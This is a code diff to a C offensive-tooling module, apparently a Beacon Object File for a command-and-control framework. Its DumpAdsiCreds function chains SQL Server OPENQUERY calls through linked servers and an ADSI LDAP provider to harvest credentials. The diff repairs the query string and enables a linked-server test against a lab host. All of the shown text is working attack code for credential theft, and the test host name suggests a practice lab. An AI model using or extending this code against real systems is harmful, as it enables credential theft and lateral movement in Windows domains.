@@ -318,7 +318,7 @@ void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, 
 		// disgusting.
 		//
 		char* part1 = "SELECT * FROM OPENQUERY(\"";
-		char* part2 = "\", 'SELECT * FROM OPENQUERY(\")";
+		char* part2 = "\", 'SELECT * FROM OPENQUERY(\"";
 		char* part3 = "\", ''SELECT * FROM ''''LDAP://localhost:"; 
 		char* part4 = "'''''')')";
 
@@ -331,10 +331,11 @@ void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, 
 		MSVCRT$strncat(trigger, adsiServer, totalSize - MSVCRT$strlen(trigger) - 1);
 		MSVCRT$strncat(trigger, part3, 		totalSize - MSVCRT$strlen(trigger) - 1);
 		MSVCRT$strncat(trigger, port, 		totalSize - MSVCRT$strlen(trigger) - 1);
+		MSVCRT$strncat(trigger, part4, 		totalSize - MSVCRT$strlen(trigger) - 1);
 	}
 
-	HandleQuery(stmt, (SQLCHAR*)trigger, link, impersonate, FALSE);
-	HandleQuery(stmt, (SQLCHAR*)trigger, link, impersonate, FALSE);
+	HandleQuery(stmt, (SQLCHAR*)trigger, NULL, impersonate, FALSE);
+	HandleQuery(stmt, (SQLCHAR*)trigger, NULL, impersonate, FALSE);
 
 	//
 	// Wait for the thread to finish
@@ -418,8 +419,8 @@ int main()
 	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
 	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "ADSIr", "4444");
 
-	//internal_printf("\n\n============ LINK TEST ============\n\n");
-	//DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "ADSIr", "4444");
+	internal_printf("\n\n============ LINK TEST ============\n\n");
+	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "ADSIEssos", "4444");
 }
 
 #endif
